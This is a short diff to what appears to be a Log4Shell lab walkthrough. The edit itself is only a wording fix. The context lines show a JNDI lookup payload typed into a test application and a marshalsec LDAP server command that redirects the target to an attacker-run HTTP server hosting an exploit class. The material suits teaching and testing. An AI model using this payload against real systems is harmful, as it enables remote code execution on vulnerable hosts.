@@ -79,7 +79,7 @@ run test application and give input (we will get and error message but ignore it
 	You have entered: ${jndi:ldap://192.168.200.101:1389/exploit}
 	23:40:46.982 [main] ERROR log4j.main - ${jndi:ldap://192.168.200.101:1389/exploit}
 
-first check ldap server, it redirected our HTTP server
+first check ldap server, it redirects to our HTTP server
 
 	└─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.200.101/#exploit
 	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
